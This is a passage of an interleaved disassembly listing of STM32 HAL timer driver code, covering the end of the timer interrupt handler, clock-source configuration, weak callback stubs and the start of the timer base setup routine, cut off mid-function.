 8004e9e:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8004ea0:	687b      	ldr	r3, [r7, #4]
 8004ea2:	681b      	ldr	r3, [r3, #0]
 8004ea4:	69db      	ldr	r3, [r3, #28]
 8004ea6:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004eaa:	2b00      	cmp	r3, #0
 8004eac:	d003      	beq.n	8004eb6 <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004eae:	6878      	ldr	r0, [r7, #4]
 8004eb0:	f000 f93b 	bl	800512a <HAL_TIM_IC_CaptureCallback>
 8004eb4:	e005      	b.n	8004ec2 <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004eb6:	6878      	ldr	r0, [r7, #4]
 8004eb8:	f000 f92d 	bl	8005116 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004ebc:	6878      	ldr	r0, [r7, #4]
 8004ebe:	f000 f93e 	bl	800513e <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004ec2:	687b      	ldr	r3, [r7, #4]
 8004ec4:	2200      	movs	r2, #0
 8004ec6:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 8004ec8:	68bb      	ldr	r3, [r7, #8]
 8004eca:	f003 0301 	and.w	r3, r3, #1
 8004ece:	2b00      	cmp	r3, #0
 8004ed0:	d00c      	beq.n	8004eec <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 8004ed2:	68fb      	ldr	r3, [r7, #12]
 8004ed4:	f003 0301 	and.w	r3, r3, #1
 8004ed8:	2b00      	cmp	r3, #0
 8004eda:	d007      	beq.n	8004eec <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8004edc:	687b      	ldr	r3, [r7, #4]
 8004ede:	681b      	ldr	r3, [r3, #0]
 8004ee0:	f06f 0201 	mvn.w	r2, #1
 8004ee4:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 8004ee6:	6878      	ldr	r0, [r7, #4]
 8004ee8:	f7fb fe64 	bl	8000bb4 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 8004eec:	68bb      	ldr	r3, [r7, #8]
 8004eee:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004ef2:	2b00      	cmp	r3, #0
 8004ef4:	d00c      	beq.n	8004f10 <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004ef6:	68fb      	ldr	r3, [r7, #12]
 8004ef8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004efc:	2b00      	cmp	r3, #0
 8004efe:	d007      	beq.n	8004f10 <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8004f00:	687b      	ldr	r3, [r7, #4]
 8004f02:	681b      	ldr	r3, [r3, #0]
 8004f04:	f06f 0280 	mvn.w	r2, #128	; 0x80
 8004f08:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 8004f0a:	6878      	ldr	r0, [r7, #4]
 8004f0c:	f000 fa9a 	bl	8005444 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8004f10:	68bb      	ldr	r3, [r7, #8]
 8004f12:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004f16:	2b00      	cmp	r3, #0
 8004f18:	d00c      	beq.n	8004f34 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f1a:	68fb      	ldr	r3, [r7, #12]
 8004f1c:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f20:	2b00      	cmp	r3, #0
 8004f22:	d007      	beq.n	8004f34 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8004f24:	687b      	ldr	r3, [r7, #4]
 8004f26:	681b      	ldr	r3, [r3, #0]
 8004f28:	f46f 7280 	mvn.w	r2, #256	; 0x100
 8004f2c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 8004f2e:	6878      	ldr	r0, [r7, #4]
 8004f30:	f000 fa92 	bl	8005458 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8004f34:	68bb      	ldr	r3, [r7, #8]
 8004f36:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004f3a:	2b00      	cmp	r3, #0
 8004f3c:	d00c      	beq.n	8004f58 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 8004f3e:	68fb      	ldr	r3, [r7, #12]
 8004f40:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004f44:	2b00      	cmp	r3, #0
 8004f46:	d007      	beq.n	8004f58 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8004f48:	687b      	ldr	r3, [r7, #4]
 8004f4a:	681b      	ldr	r3, [r3, #0]
 8004f4c:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8004f50:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8004f52:	6878      	ldr	r0, [r7, #4]
 8004f54:	f000 f8fd 	bl	8005152 <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8004f58:	68bb      	ldr	r3, [r7, #8]
 8004f5a:	f003 0320 	and.w	r3, r3, #32
 8004f5e:	2b00      	cmp	r3, #0
 8004f60:	d00c      	beq.n	8004f7c <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8004f62:	68fb      	ldr	r3, [r7, #12]
 8004f64:	f003 0320 	and.w	r3, r3, #32
 8004f68:	2b00      	cmp	r3, #0
 8004f6a:	d007      	beq.n	8004f7c <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8004f6c:	687b      	ldr	r3, [r7, #4]
 8004f6e:	681b      	ldr	r3, [r3, #0]
 8004f70:	f06f 0220 	mvn.w	r2, #32
 8004f74:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8004f76:	6878      	ldr	r0, [r7, #4]
 8004f78:	f000 fa5a 	bl	8005430 <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8004f7c:	bf00      	nop
 8004f7e:	3710      	adds	r7, #16
 8004f80:	46bd      	mov	sp, r7
 8004f82:	bd80      	pop	{r7, pc}

08004f84 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8004f84:	b580      	push	{r7, lr}
 8004f86:	b084      	sub	sp, #16
 8004f88:	af00      	add	r7, sp, #0
 8004f8a:	6078      	str	r0, [r7, #4]
 8004f8c:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8004f8e:	2300      	movs	r3, #0
 8004f90:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 8004f92:	687b      	ldr	r3, [r7, #4]
 8004f94:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8004f98:	2b01      	cmp	r3, #1
 8004f9a:	d101      	bne.n	8004fa0 <HAL_TIM_ConfigClockSource+0x1c>
 8004f9c:	2302      	movs	r3, #2
 8004f9e:	e0b6      	b.n	800510e <HAL_TIM_ConfigClockSource+0x18a>
 8004fa0:	687b      	ldr	r3, [r7, #4]
 8004fa2:	2201      	movs	r2, #1
 8004fa4:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8004fa8:	687b      	ldr	r3, [r7, #4]
 8004faa:	2202      	movs	r2, #2
 8004fac:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 8004fb0:	687b      	ldr	r3, [r7, #4]
 8004fb2:	681b      	ldr	r3, [r3, #0]
 8004fb4:	689b      	ldr	r3, [r3, #8]
 8004fb6:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 8004fb8:	68bb      	ldr	r3, [r7, #8]
 8004fba:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004fbe:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 8004fc2:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8004fc4:	68bb      	ldr	r3, [r7, #8]
 8004fc6:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8004fca:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8004fcc:	687b      	ldr	r3, [r7, #4]
 8004fce:	681b      	ldr	r3, [r3, #0]
 8004fd0:	68ba      	ldr	r2, [r7, #8]
 8004fd2:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 8004fd4:	683b      	ldr	r3, [r7, #0]
 8004fd6:	681b      	ldr	r3, [r3, #0]
 8004fd8:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8004fdc:	d03e      	beq.n	800505c <HAL_TIM_ConfigClockSource+0xd8>
 8004fde:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8004fe2:	f200 8087 	bhi.w	80050f4 <HAL_TIM_ConfigClockSource+0x170>
 8004fe6:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8004fea:	f000 8086 	beq.w	80050fa <HAL_TIM_ConfigClockSource+0x176>
 8004fee:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8004ff2:	d87f      	bhi.n	80050f4 <HAL_TIM_ConfigClockSource+0x170>
 8004ff4:	2b70      	cmp	r3, #112	; 0x70
 8004ff6:	d01a      	beq.n	800502e <HAL_TIM_ConfigClockSource+0xaa>
 8004ff8:	2b70      	cmp	r3, #112	; 0x70
 8004ffa:	d87b      	bhi.n	80050f4 <HAL_TIM_ConfigClockSource+0x170>
 8004ffc:	2b60      	cmp	r3, #96	; 0x60
 8004ffe:	d050      	beq.n	80050a2 <HAL_TIM_ConfigClockSource+0x11e>
 8005000:	2b60      	cmp	r3, #96	; 0x60
 8005002:	d877      	bhi.n	80050f4 <HAL_TIM_ConfigClockSource+0x170>
 8005004:	2b50      	cmp	r3, #80	; 0x50
 8005006:	d03c      	beq.n	8005082 <HAL_TIM_ConfigClockSource+0xfe>
 8005008:	2b50      	cmp	r3, #80	; 0x50
 800500a:	d873      	bhi.n	80050f4 <HAL_TIM_ConfigClockSource+0x170>
 800500c:	2b40      	cmp	r3, #64	; 0x40
 800500e:	d058      	beq.n	80050c2 <HAL_TIM_ConfigClockSource+0x13e>
 8005010:	2b40      	cmp	r3, #64	; 0x40
 8005012:	d86f      	bhi.n	80050f4 <HAL_TIM_ConfigClockSource+0x170>
 8005014:	2b30      	cmp	r3, #48	; 0x30
 8005016:	d064      	beq.n	80050e2 <HAL_TIM_ConfigClockSource+0x15e>
 8005018:	2b30      	cmp	r3, #48	; 0x30
 800501a:	d86b      	bhi.n	80050f4 <HAL_TIM_ConfigClockSource+0x170>
 800501c:	2b20      	cmp	r3, #32
 800501e:	d060      	beq.n	80050e2 <HAL_TIM_ConfigClockSource+0x15e>
 8005020:	2b20      	cmp	r3, #32
 8005022:	d867      	bhi.n	80050f4 <HAL_TIM_ConfigClockSource+0x170>
 8005024:	2b00      	cmp	r3, #0
 8005026:	d05c      	beq.n	80050e2 <HAL_TIM_ConfigClockSource+0x15e>
 8005028:	2b10      	cmp	r3, #16
 800502a:	d05a      	beq.n	80050e2 <HAL_TIM_ConfigClockSource+0x15e>
 800502c:	e062      	b.n	80050f4 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 800502e:	687b      	ldr	r3, [r7, #4]
 8005030:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8005032:	683b      	ldr	r3, [r7, #0]
 8005034:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005036:	683b      	ldr	r3, [r7, #0]
 8005038:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 800503a:	683b      	ldr	r3, [r7, #0]
 800503c:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 800503e:	f000 f971 	bl	8005324 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 8005042:	687b      	ldr	r3, [r7, #4]
 8005044:	681b      	ldr	r3, [r3, #0]
 8005046:	689b      	ldr	r3, [r3, #8]
 8005048:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 800504a:	68bb      	ldr	r3, [r7, #8]
 800504c:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 8005050:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 8005052:	687b      	ldr	r3, [r7, #4]
 8005054:	681b      	ldr	r3, [r3, #0]
 8005056:	68ba      	ldr	r2, [r7, #8]
 8005058:	609a      	str	r2, [r3, #8]
      break;
 800505a:	e04f      	b.n	80050fc <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 800505c:	687b      	ldr	r3, [r7, #4]
 800505e:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8005060:	683b      	ldr	r3, [r7, #0]
 8005062:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005064:	683b      	ldr	r3, [r7, #0]
 8005066:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005068:	683b      	ldr	r3, [r7, #0]
 800506a:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 800506c:	f000 f95a 	bl	8005324 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 8005070:	687b      	ldr	r3, [r7, #4]
 8005072:	681b      	ldr	r3, [r3, #0]
 8005074:	689a      	ldr	r2, [r3, #8]
 8005076:	687b      	ldr	r3, [r7, #4]
 8005078:	681b      	ldr	r3, [r3, #0]
 800507a:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 800507e:	609a      	str	r2, [r3, #8]
      break;
 8005080:	e03c      	b.n	80050fc <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 8005082:	687b      	ldr	r3, [r7, #4]
 8005084:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005086:	683b      	ldr	r3, [r7, #0]
 8005088:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 800508a:	683b      	ldr	r3, [r7, #0]
 800508c:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800508e:	461a      	mov	r2, r3
 8005090:	f000 f8ce 	bl	8005230 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 8005094:	687b      	ldr	r3, [r7, #4]
 8005096:	681b      	ldr	r3, [r3, #0]
 8005098:	2150      	movs	r1, #80	; 0x50
 800509a:	4618      	mov	r0, r3
 800509c:	f000 f927 	bl	80052ee <TIM_ITRx_SetConfig>
      break;
 80050a0:	e02c      	b.n	80050fc <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 80050a2:	687b      	ldr	r3, [r7, #4]
 80050a4:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050a6:	683b      	ldr	r3, [r7, #0]
 80050a8:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050aa:	683b      	ldr	r3, [r7, #0]
 80050ac:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 80050ae:	461a      	mov	r2, r3
 80050b0:	f000 f8ed 	bl	800528e <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 80050b4:	687b      	ldr	r3, [r7, #4]
 80050b6:	681b      	ldr	r3, [r3, #0]
 80050b8:	2160      	movs	r1, #96	; 0x60
 80050ba:	4618      	mov	r0, r3
 80050bc:	f000 f917 	bl	80052ee <TIM_ITRx_SetConfig>
      break;
 80050c0:	e01c      	b.n	80050fc <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80050c2:	687b      	ldr	r3, [r7, #4]
 80050c4:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050c6:	683b      	ldr	r3, [r7, #0]
 80050c8:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050ca:	683b      	ldr	r3, [r7, #0]
 80050cc:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 80050ce:	461a      	mov	r2, r3
 80050d0:	f000 f8ae 	bl	8005230 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 80050d4:	687b      	ldr	r3, [r7, #4]
 80050d6:	681b      	ldr	r3, [r3, #0]
 80050d8:	2140      	movs	r1, #64	; 0x40
 80050da:	4618      	mov	r0, r3
 80050dc:	f000 f907 	bl	80052ee <TIM_ITRx_SetConfig>
      break;
 80050e0:	e00c      	b.n	80050fc <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 80050e2:	687b      	ldr	r3, [r7, #4]
 80050e4:	681a      	ldr	r2, [r3, #0]
 80050e6:	683b      	ldr	r3, [r7, #0]
 80050e8:	681b      	ldr	r3, [r3, #0]
 80050ea:	4619      	mov	r1, r3
 80050ec:	4610      	mov	r0, r2
 80050ee:	f000 f8fe 	bl	80052ee <TIM_ITRx_SetConfig>
      break;
 80050f2:	e003      	b.n	80050fc <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 80050f4:	2301      	movs	r3, #1
 80050f6:	73fb      	strb	r3, [r7, #15]
      break;
 80050f8:	e000      	b.n	80050fc <HAL_TIM_ConfigClockSource+0x178>
      break;
 80050fa:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 80050fc:	687b      	ldr	r3, [r7, #4]
 80050fe:	2201      	movs	r2, #1
 8005100:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005104:	687b      	ldr	r3, [r7, #4]
 8005106:	2200      	movs	r2, #0
 8005108:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 800510c:	7bfb      	ldrb	r3, [r7, #15]
}
 800510e:	4618      	mov	r0, r3
 8005110:	3710      	adds	r7, #16
 8005112:	46bd      	mov	sp, r7
 8005114:	bd80      	pop	{r7, pc}

08005116 <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 8005116:	b480      	push	{r7}
 8005118:	b083      	sub	sp, #12
 800511a:	af00      	add	r7, sp, #0
 800511c:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 800511e:	bf00      	nop
 8005120:	370c      	adds	r7, #12
 8005122:	46bd      	mov	sp, r7
 8005124:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005128:	4770      	bx	lr

0800512a <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 800512a:	b480      	push	{r7}
 800512c:	b083      	sub	sp, #12
 800512e:	af00      	add	r7, sp, #0
 8005130:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 8005132:	bf00      	nop
 8005134:	370c      	adds	r7, #12
 8005136:	46bd      	mov	sp, r7
 8005138:	f85d 7b04 	ldr.w	r7, [sp], #4
 800513c:	4770      	bx	lr

0800513e <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 800513e:	b480      	push	{r7}
 8005140:	b083      	sub	sp, #12
 8005142:	af00      	add	r7, sp, #0
 8005144:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 8005146:	bf00      	nop
 8005148:	370c      	adds	r7, #12
 800514a:	46bd      	mov	sp, r7
 800514c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005150:	4770      	bx	lr

08005152 <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 8005152:	b480      	push	{r7}
 8005154:	b083      	sub	sp, #12
 8005156:	af00      	add	r7, sp, #0
 8005158:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 800515a:	bf00      	nop
 800515c:	370c      	adds	r7, #12
 800515e:	46bd      	mov	sp, r7
 8005160:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005164:	4770      	bx	lr
	...

08005168 <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 8005168:	b480      	push	{r7}
 800516a:	b085      	sub	sp, #20
 800516c:	af00      	add	r7, sp, #0
 800516e:	6078      	str	r0, [r7, #4]
 8005170:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 8005172:	687b      	ldr	r3, [r7, #4]
 8005174:	681b      	ldr	r3, [r3, #0]
 8005176:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 8005178:	687b      	ldr	r3, [r7, #4]
 800517a:	4a2a      	ldr	r2, [pc, #168]	; (8005224 <TIM_Base_SetConfig+0xbc>)
 800517c:	4293      	cmp	r3, r2
 800517e:	d003      	beq.n	8005188 <TIM_Base_SetConfig+0x20>
 8005180:	687b      	ldr	r3, [r7, #4]
 8005182:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005186:	d108      	bne.n	800519a <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 8005188:	68fb      	ldr	r3, [r7, #12]
 800518a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800518e:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 8005190:	683b      	ldr	r3, [r7, #0]
 8005192:	685b      	ldr	r3, [r3, #4]
 8005194:	68fa      	ldr	r2, [r7, #12]
 8005196:	4313      	orrs	r3, r2
 8005198:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 800519a:	687b      	ldr	r3, [r7, #4]
 800519c:	4a21      	ldr	r2, [pc, #132]	; (8005224 <TIM_Base_SetConfig+0xbc>)
 800519e:	4293      	cmp	r3, r2
 80051a0:	d00b      	beq.n	80051ba <TIM_Base_SetConfig+0x52>
 80051a2:	687b      	ldr	r3, [r7, #4]
 80051a4:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80051a8:	d007      	beq.n	80051ba <TIM_Base_SetConfig+0x52>
 80051aa:	687b      	ldr	r3, [r7, #4]
 80051ac:	4a1e      	ldr	r2, [pc, #120]	; (8005228 <TIM_Base_SetConfig+0xc0>)
 80051ae:	4293      	cmp	r3, r2
 80051b0:	d003      	beq.n	80051ba <TIM_Base_SetConfig+0x52>
 80051b2:	687b      	ldr	r3, [r7, #4]
 80051b4:	4a1d      	ldr	r2, [pc, #116]	; (800522c <TIM_Base_SetConfig+0xc4>)
 80051b6:	4293      	cmp	r3, r2
 80051b8:	d108      	bne.n	80051cc <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 80051ba:	68fb      	ldr	r3, [r7, #12]
 80051bc:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80051c0:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 80051c2:	683b      	ldr	r3, [r7, #0]
 80051c4:	68db      	ldr	r3, [r3, #12]
 80051c6:	68fa      	ldr	r2, [r7, #12]
 80051c8:	4313      	orrs	r3, r2
 80051ca:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
